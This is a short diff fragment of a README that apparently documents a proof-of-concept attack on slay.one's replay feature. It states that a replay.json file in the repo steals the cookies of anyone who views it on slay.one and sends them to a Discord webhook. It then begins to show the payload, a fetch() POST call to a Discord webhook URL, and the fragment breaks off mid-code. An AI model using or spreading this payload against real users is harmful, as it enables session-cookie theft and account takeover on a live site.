@@ -17,7 +17,7 @@ This can be explioted with slay.one's replay feature where users can download re
 
 As a proof of concept the replay.json file in the repo if viewed on slay.one will steal your cookies and send it to a discord webhook 
 
-```json
+```
 dbg$fetch('https://discord.com/api/webhooks/{webhookID}/{webhookToken}{
     method: 
         'POST',headers: {'Content-Type': 'application/json'},
